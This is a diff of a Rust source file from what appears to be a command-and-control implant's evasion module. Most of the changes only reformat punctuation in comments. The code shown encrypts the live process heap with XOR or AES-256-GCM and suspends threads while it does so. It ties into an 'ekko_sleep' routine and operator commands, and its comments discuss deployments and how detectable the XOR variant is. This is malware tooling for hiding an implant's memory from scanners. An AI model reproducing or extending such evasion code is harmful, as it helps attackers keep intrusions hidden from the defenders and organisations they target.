@@ -5,12 +5,12 @@
 //   - XOR-based heap encryption (legacy, 16-byte repeating key)
 //   - AES-256-GCM stream-cipher heap encryption (upgrade, same-length output)
 //
-// CRITICAL: The process heap is shared across ALL threads.  If any thread
+// CRITICAL: The process heap is shared across ALL threads. If any thread
 // accesses the heap while it is encrypted the process will access-violate.
 // Always call suspend_other_threads() before encrypting and resume_threads()
-// after decrypting.  Do NOT call these functions from inside ekko_sleep —
+// after decrypting. Do NOT call these functions from inside ekko_sleep -
 // suspending Tokio worker threads while they hold the allocator lock causes
-// deadlock.  Reserve explicit heap encryption for operator commands
+// deadlock. Reserve explicit heap encryption for operator commands
 // (evasion:encrypt_heap_aes / evasion:decrypt_heap_aes).
 
 // ── Thread Suspension ──────────────────────────────────────────────────
@@ -100,28 +100,28 @@ pub fn resume_threads(_handles: Vec<*mut std::ffi::c_void>) {}
 // MUST match winnt.h _PROCESS_HEAP_ENTRY exactly (x64):
 //
 //   typedef struct _PROCESS_HEAP_ENTRY {
-//       PVOID lpData;        // offset  0, 8 bytes
-//       DWORD cbData;        // offset  8, 4 bytes
-//       BYTE  cbOverhead;    // offset 12, 1 byte
-//       BYTE  iRegionIndex;  // offset 13, 1 byte
-//       WORD  wFlags;        // offset 14, 2 bytes
+//       PVOID lpData; // offset 0, 8 bytes
+//       DWORD cbData; // offset 8, 4 bytes
+//       BYTE cbOverhead; // offset 12, 1 byte
+//       BYTE iRegionIndex; // offset 13, 1 byte
+//       WORD wFlags; // offset 14, 2 bytes
 //       union { Block; Region; }; // offset 16, 24 bytes
-//   } PROCESS_HEAP_ENTRY;    // sizeof = 40, align = 8
+//   } PROCESS_HEAP_ENTRY; // sizeof = 40, align = 8
 //
-// BUG HISTORY: `size` used to be declared `usize` (8 bytes) where the real
-// cbData is a 4-byte DWORD.  That shifted every later field: `flags` read
+// `size` used to be declared `usize` (8 bytes) where the real
+// cbData is a 4-byte DWORD. That shifted every later field: `flags` read
 // union garbage (so the BUSY check was effectively random) and `size`
-// picked up cbOverhead|iRegionIndex|wFlags in its high 4 bytes — ≈ 2^50
-// for any busy block (wFlags = 0x4).  from_raw_parts_mut(data, size) then
+// picked up cbOverhead|iRegionIndex|wFlags in its high 4 bytes - ≈ 2^50
+// for any busy block (wFlags = 0x4). from_raw_parts_mut(data, size) then
 // built a petabyte-scale "slice" and the XOR/AES loop wrote until an
-// access violation, trashing the heap.  The layout is pinned by unit
-// tests at the bottom of this file — do not change it casually.
+// access violation, trashing the heap. The layout is pinned by unit
+// tests at the bottom of this file - do not change it casually.
 
 #[allow(dead_code)] // constructed only on Windows and in tests
 #[repr(C)]
 struct ProcessHeapEntry {
     data:         *mut std::ffi::c_void,
-    size:         u32,   // cbData is a DWORD — 4 bytes, NOT usize
+    size:         u32,   // cbData is a DWORD - 4 bytes, NOT usize
     overhead:     u8,
     region_index: u8,
     flags:        u16,
@@ -130,12 +130,12 @@ struct ProcessHeapEntry {
 
 // ── XOR Heap Encryption (legacy) ──────────────────────────────────────
 // Walks the process heap via HeapWalk and XORs every live block with a
-// repeating 16-byte key.  Self-inverse: calling with the same key
+// repeating 16-byte key. Self-inverse: calling with the same key
 // restores the original content.
 //
-// Prefer encrypt_heap_aes256gcm for new deployments — the XOR key is
+// Prefer encrypt_heap_aes256gcm for new deployments - the XOR key is
 // short and the operation is detectable by comparing heap bytes against
-// a repeating pattern.  The AES variant is kept for backward compat
+// a repeating pattern. The AES variant is kept for backward compat
 // with existing operator playbooks that reference evasion:encrypt_heap.
 
 #[cfg(target_os = "windows")]
@@ -180,7 +180,7 @@ pub fn encrypt_heap(xor_key: &[u8; 16]) -> Result<usize, String> {
 #[cfg(not(target_os = "windows"))]
 pub fn encrypt_heap(_xor_key: &[u8; 16]) -> Result<usize, String> { Ok(0) }
 
-/// XOR is its own inverse — decrypt by calling encrypt with the same key.
+/// XOR is its own inverse - decrypt by calling encrypt with the same key.
 pub fn decrypt_heap(xor_key: &[u8; 16]) -> Result<usize, String> {
     encrypt_heap(xor_key)
 }
@@ -200,7 +200,7 @@ pub fn decrypt_heap(xor_key: &[u8; 16]) -> Result<usize, String> {
 //
 // Zero heap allocation: encrypt_in_place_detached (AeadInPlace) modifies
 // the block in place and returns the tag as a fixed-size stack array that
-// is discarded — no heap allocation while HeapLock is held.
+// is discarded - no heap allocation while HeapLock is held.
 
 #[cfg(target_os = "windows")]
 pub fn encrypt_heap_aes256gcm(key: &[u8; 32], base_nonce: &[u8; 12]) -> Result<usize, String> {
@@ -216,7 +216,7 @@ pub fn encrypt_heap_aes256gcm(key: &[u8; 32], base_nonce: &[u8; 12]) -> Result<u
 
     const PROCESS_HEAP_ENTRY_BUSY: u16 = 0x4;
 
-    // Key schedule is stack-allocated (~240 bytes) — no heap alloc.
+    // Key schedule is stack-allocated (~240 bytes) - no heap alloc.
     let cipher = Aes256Gcm::new_from_slice(key).map_err(|e| format!("cipher init: {e}"))?;
 
     unsafe {
@@ -240,7 +240,7 @@ pub fn encrypt_heap_aes256gcm(key: &[u8; 32], base_nonce: &[u8; 12]) -> Result<u
                 let nonce = Nonce::from_slice(&bn);
 
                 let block = std::slice::from_raw_parts_mut(entry.data as *mut u8, entry.size as usize);
-                // Tag returned on the stack and discarded — no allocation.
+                // Tag returned on the stack and discarded - no allocation.
                 let _ = cipher.encrypt_in_place_detached(nonce, b"", block);
 
                 count += 1;
@@ -253,7 +253,7 @@ pub fn encrypt_heap_aes256gcm(key: &[u8; 32], base_nonce: &[u8; 12]) -> Result<u
     }
 }
 
-/// CTR stream is self-inverse — decrypt by calling encrypt with the same key+nonce.
+/// CTR stream is self-inverse - decrypt by calling encrypt with the same key+nonce.
 #[cfg(target_os = "windows")]
 pub fn decrypt_heap_aes256gcm(key: &[u8; 32], base_nonce: &[u8; 12]) -> Result<usize, String> {
     encrypt_heap_aes256gcm(key, base_nonce)
@@ -274,9 +274,9 @@ mod tests {
     // Regression test for the struct-layout bug: `size` was declared
     // `usize` (8 bytes) where the real cbData is a DWORD (4 bytes),
     // shifting every subsequent field and making from_raw_parts_mut()
-    // build petabyte-sized slices.  Pin the exact winnt.h x64 layout so
-    // the mistake cannot silently return.  (The old struct was declared
-    // inside the functions, out of reach of tests — another reason the
+    // build petabyte-sized slices. Pin the exact winnt.h x64 layout so
+    // the mistake cannot silently return. (The old struct was declared
+    // inside the functions, out of reach of tests - another reason the
     // bug survived.)
 
     #[test]
@@ -345,7 +345,7 @@ mod tests {
     // ── XOR cipher properties ─────────────────────────────────────────────
     //
     // encrypt_heap() operates on the live process heap via HeapLock +
-    // HeapWalk.  Calling it directly in a test would encrypt the test
+    // HeapWalk. Calling it directly in a test would encrypt the test
     // framework's own heap allocations, crash the runner, or deadlock.
     //
     // Instead these tests exercise the same XOR logic on isolated stack
@@ -397,7 +397,7 @@ mod tests {
     #[test]
     fn xor_repeating_key_pattern_applies_modularly() {
         // With a 16-byte key and a 32-byte buffer the second 16 bytes get
-        // the same keystream as the first — XOR is independently verifiable.
+        // the same keystream as the first - XOR is independently verifiable.
         let key: [u8; 16] = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15];
         let mut buf = [0u8; 32];
         xor_buf(&mut buf, &key);
@@ -410,7 +410,7 @@ mod tests {
     // ── AES-256-GCM stream cipher properties ──────────────────────────────
     //
     // encrypt_heap_aes256gcm also operates on the live heap and is not
-    // safe to call directly in tests.  The following tests verify the same
+    // safe to call directly in tests. The following tests verify the same
     // underlying properties using the aes_gcm crate primitives directly
     // on isolated buffers.
 
@@ -458,7 +458,7 @@ mod tests {
 
     #[test]
     fn aes256gcm_output_length_equals_input_length() {
-        // The tag is returned separately and discarded — output is same length
+        // The tag is returned separately and discarded - output is same length
         // as input, which is the whole point for in-place heap block encryption.
         use aes_gcm::{aead::AeadInPlace, Aes256Gcm, KeyInit, Nonce};
         let cipher = Aes256Gcm::new_from_slice(&[0xDE_u8; 32]).unwrap();
